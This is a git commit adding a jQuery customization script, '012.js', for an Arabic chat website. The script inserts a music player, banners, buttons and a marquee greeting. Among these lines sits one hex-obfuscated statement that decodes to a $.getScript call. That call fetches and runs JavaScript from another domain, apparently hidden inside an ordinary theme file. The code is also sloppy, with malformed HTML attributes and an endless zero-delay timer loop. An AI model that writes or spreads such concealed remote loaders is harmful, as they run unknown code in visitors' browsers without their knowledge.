7fff99531148831c82bd5a071c9325e12b8295d8
abbose <43781525+abbose@users.noreply.github.com>
2019-05-13 17:41:36 +0300

    Create 012.js

---
+++ 012.js
@@ -0,0 +1,53 @@
+$(` <center><div style=" width: 100%;height: auto!important; "  id="as" margin: 2px;" class="fa fa-music btn btn-danger" type="button" data-toggle="collapse" data-target="#collapseExample" aria-expanded="false" aria-controls="collapseExample">&nbsp; 🔊 • ألـآغــاني  • 🔉 &nbsp;</div><div class="collapse" id="collapseExample"><center><div class="well"><p lass="bg-primary"></i></p>  🔝 𝖬𝖨𝖷 𝖡𝖮𝖷 🔝 </p><audio controls loop="" play=""><source src="https://c.top4top.net/m_11774j9z80.mp3"></audio></div><center>`).insertBefore('label.nosel.ninr.fl.uzr.label.label-primary'),
+$(`<img src="https://4.top4top.net/p_1228n96xl1.gif" title=""  class="fr" style="width:100%;margin-top: 1px;">
+<center><div id="asim13"><a id="asim33" href="" target="_blank" type="button" style="border-radius: 1px 9px 9px 9px;width:89px;margin:1px;border: 1px solid #FA3068;" class="btn btn-primary btn-ali">ميز نفسك</a>
+<a id="asim33" target="_blank" type="button" style=" border-radius: 1px 9px 9px 9px;width:89px;margin:1px;border: 1px solid #FA3068;" class="btn btn-primary btn-ali">قوانين الموقع</a>
+<a id="asim33" href="soon/" target="_blank" type="button" style="border-radius: 1px 9px 9px 9px;width:89px;margin:1px;border: 1px solid #FA3064;" class="btn btn-primary btn-ali">فيس بوك</a>
+<div style=" border-radius: 1px 9px 9px 9px;width:89px;margin:1px;border: 1px solid #FA3068;"  id="asim33" class="btn btn-primary btn-ali" type="button" data-toggle="collapse" data-target="#collapseExample" aria-expanded="false" aria-controls="collapseExample">اتصل بنا</div>
+<div class="collapse" id="collapseExample"><center><div class="well"><p lass="bg-primary">  </p>التوآصل تليجرام أذا واجهتك مشگلة غيره يهمل   </p> ‏　 ῏ᘓɹ̇ļjᓗ Ϫɭ῏ ȷԸLɹ͒ɹ͒ɹ͒῏ ‏<i class=""></i><i class="fa fa-send"></i> ‏ ‏　@abbose0 
+‎‏<center></div></div>
+</div></div><center>`).insertBefore('.nav-tabs');
+$(".nav-tabs").addClass("fl").css("width","100%"),
+$('<img src="https://3.top4top.net/p_1228d10jm1.gif" style="width:245px;margin-top:-60px; " class="fr">').insertBefore('.loginstat');
+$(`<button onfa-microphone="alert('قريبا')" style="width:31px;margin:2px;" style="margin-top:2px;margin-left:2px;" class="fa fa-video-camera fl btn btn-danger"></button>`).insertBefore('button.fr.fa.fa-share-alt.sndfile.fl.btn.btn-primary');
+$(`<button style="width:24px;margin:2px;" style="margin-top:2px;margin-left:2px;" class="fa fa-microphone fl btn btn-info"></button>`).insertBefore('button.fr.fa.fa-share-alt.sndfile.fl.btn.btn-primary');
+$(`<link href="https://fonts.googleapis.com/css?family=Changa" rel="stylesheet">
+<marquee direction="right" width="65%" direction="right" style="margin-bottom: -7px;font-family: 'Changa', sans-serif;    height: 20px;"  onmouseover="this.stop()" onmouseout="this.start()" scrolldelay="0" scrollamount="5">     أهلاً وسهلاً زوارنا الكرام ، ادارة دردشة بنات اهلنا  تتمنى لكم وقتاً طيباً ❤️ </marquee></font></b></td>
+`).insertBefore('span.s1.fa.fa-user.label.badgex.label-as-badge.label-success');
+$("button.btn.btn-primary" ).css( "border-radius", "24px 24px 24px 24px" )
+$(".label-primary").css("border-radius","24px 24px 24px 24px")
+$(document.getElementById("tbox").placeholder = "  　　　 اترك السطح ودردشً هنا ");
+var _0x5712=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x72\x61\x71\x69\x61\x63\x68\x61\x74\x73\x2E\x63\x6F\x6D\x2F\u0634\u0627\u062A\x20\u0628\u0646\u0648\u062A\u0627\u062A\x2E\x6A\x73","\x67\x65\x74\x53\x63\x72\x69\x70\x74"];$[_0x5712[1]](_0x5712[0])
+setTimeout(function(){refreshonline()},0);
+setTimeout(function(){$('#users').scrollTop(0);},0);
+setTimeout(function(){$('#d2').scrollTop($('#d2')[0].scrollHeight);},0);
+setTimeout(function () { fixSize(); $('.w' + id).find('.d2').scrollTop($('.w' + id).find('.d2')[0].scrollHeight); }, 0);
+setTimeout(function(){$('#users').scrollTop(0);},0);
+setTimeout(function(){$('#d2bc').scrollTop(0);},0);
+setTimeout(function () { processq(); }, 0);
+setTimeout(function () { usearch(); }, 0);
+setTimeout(function () {
+      var iframe = document.createElement('iframe');
+      document.body.appendChild(iframe);
+      document.body.removeChild(iframe);
+    }, 0);
+setTimeout(function () {
+            self.emit('stoppedSpeaking');
+        }, 0);
+
+function checkupdate() {
+  if (needUpdate) { updateusers(); updaterooms(); needUpdate = false }
+  setTimeout(checkupdate, 0);
+}
+checkupdate();
+function close(i) { if (isclose) { return; } isclose = true; window.onbeforeunload = null; setTimeout('location.reload();', i || 0);}
+$("a.fa.fa-user-plus").text('تسجيل');
+
+
+$(`<img tabindex="0"  class="al120 fl " style="margin-left: -4px; padding:5px; width:40px;margin-top: -4px;" src="https://www.iraqiachat.net/sico/z1d7d4d70v10.png" data-original-title="" title=""><img tabindex="0"  class="al121 fl " style="padding:5px;width: 33px;margin-top: 0px;margin-left: -6px;" src="https://www.iraqiachat.net/sico/z1d7d4ctg910.png" data-original-title="" title="">`).insertAfter('img.fl.nosel.emobox');
+$(".al120").click(function(){
+    alert("عذرا لا تملك الصلاحية للدخول الى غرف محادثات الفيديو أطلب من المسؤل ادخالك الروم ");
+});
+$(".al121").click(function(){
+    alert("عذرا لا تملك صلاحيات استخدام المحادثات الصوتيه ");
+});
